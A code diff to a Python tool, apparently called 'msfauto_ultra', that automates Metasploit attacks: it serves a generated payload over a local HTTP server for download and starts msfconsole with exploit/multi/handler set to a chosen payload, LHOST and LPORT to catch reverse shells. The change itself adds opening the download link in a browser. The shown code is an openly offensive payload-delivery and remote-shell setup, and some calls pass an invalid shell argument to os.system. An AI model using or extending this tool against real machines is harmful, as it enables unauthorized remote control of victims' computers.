@@ -1,7 +1,7 @@
 from tkinter import * 
 from tkinter import messagebox as msg
 from colorama import Fore, Back, Style, init
-import platform, os, random, time, subprocess
+import platform, os, random, time, subprocess, webbrowser
 init(autoreset=True)
 class msfauto_ultra():
     def __init__(self, app_name, ip, port_one, port_two, payload):
@@ -25,7 +25,8 @@ class msfauto_ultra():
         os.system(f"cd Output && python3 -m http.server {self.port2} -b {self.ip}", shell=True)
         print(Fore.RED + "You closed http server.")
     def return_links(self):  
-        return f"Download app link: \nDocument address:\nhttps://{self.ip}:{self.port2}/"
+        webbrowser.open(f"https://{self.ip}:{self.port2}/")
+        return f"\nDocument address:\nhttps://{self.ip}:{self.port2}/"
     def start_msfconsole(self):
         print(Style.BRIGHT + Fore.GREEN + "Starting msfconsole...\n")
         os.system(f'msfconsole -x "set PAYLOAD {self.payload}" -x "use exploit/multi/handler" -x "set LHOST {self.ip}" -x "set LPORT {self.port1}" -x "exploit"', shell=True)
